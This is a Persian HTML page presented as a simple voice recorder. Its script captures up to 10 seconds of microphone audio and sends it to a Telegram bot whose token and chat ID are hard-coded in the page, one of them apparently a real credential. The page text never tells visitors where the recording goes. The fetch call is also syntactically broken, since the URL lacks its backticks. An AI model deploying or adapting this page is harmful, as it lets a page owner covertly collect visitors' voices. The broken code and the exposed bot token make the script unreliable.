<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>ضبط صدا</title>
  <style>
    body {
      font-family: Tahoma, sans-serif;
      text-align: center;
      padding: 50px;
      background: #f0f2f5;
    }
    button {
      padding: 15px 30px;
      font-size: 18px;
      background: #0088cc;
      color: white;
      border: none;
      border-radius: 10px;
      cursor: pointer;
      margin: 10px;
    }
    button:disabled {
      background: #ccc;
      cursor: not-allowed;
    }
    #status {
      margin: 20px;
      font-size: 16px;
      color: #333;
    }
  </style>
</head>
<body>

  <h2>ضبط صدای شما</h2>
  <p>برای شروع ضبط، روی دکمه زیر کلیک کنید و اجازه دسترسی به میکروفون را بدهید.</p>

  <button id="startBtn">شروع ضبط (10 ثانیه)</button>
  <button id="stopBtn" disabled>توقف</button>

  <div id="status">آماده برای ضبط...</div>

  <script>
    const TELEGRAM_BOT_TOKEN = "8584809785:AAH0ZKscGQtQQl38yTcjq4wMRiWw1xWEON4"; // توکن باتت رو اینجا بذار
    const TELEGRAM_CHAT_ID = "6080665310"; // آیدی عددی تلگرامت (از @userinfobot بگیر)

    let mediaRecorder;
    let audioChunks = [];

    const startBtn = document.getElementById('startBtn');
    const stopBtn = document.getElementById('stopBtn');
    const status = document.getElementById('status');

    startBtn.onclick = async () => {
      try {
        status.textContent = "در حال درخواست دسترسی به میکروفون...";
        const stream = await navigator.mediaDevices.getUserMedia({ audio: true });

        mediaRecorder = new MediaRecorder(stream);
        audioChunks = [];

        mediaRecorder.ondataavailable = event => {
          audioChunks.push(event.data);
        };

        mediaRecorder.onstop = () => {
          const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
          sendToTelegram(audioBlob);
        };

        mediaRecorder.start();
        startBtn.disabled = true;
        stopBtn.disabled = false;
        status.textContent = "در حال ضبط... (10 ثانیه)";

        // ضبط خودکار بعد از 10 ثانیه متوقف بشه
        setTimeout(() => {
          if (mediaRecorder.state === "recording") {
            mediaRecorder.stop();
            stream.getTracks().forEach(track => track.stop());
          }
        }, 10000);

      } catch (err) {
        status.textContent = "خطا: دسترسی به میکروفون رد شد یا مشکلی وجود دارد.";
        console.error(err);
      }
    };

    stopBtn.onclick = () => {
      if (mediaRecorder && mediaRecorder.state === "recording") {
        mediaRecorder.stop();
        stopBtn.disabled = true;
        startBtn.disabled = false;
        status.textContent = "در حال ارسال به تلگرام...";
      }
    };

    async function sendToTelegram(audioBlob) {
      const formData = new FormData();
      formData.append('chat_id', TELEGRAM_CHAT_ID);
      formData.append('audio', audioBlob, 'voice.webm');

      try {
        const response = await fetch(https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendAudio, {
          method: 'POST',
          body: formData
        });

        const result = await response.json();
        if (result.ok) {
          status.textContent = "صدا با موفقیت به تلگرام ارسال شد!";
        } else {
          status.textContent = "خطا در ارسال: " + result.description;
        }
      } catch (err) {
        status.textContent = "خطا در ارتباط با تلگرام.";
        console.error(err);
      }
    }
  </script>

</body>
</html>
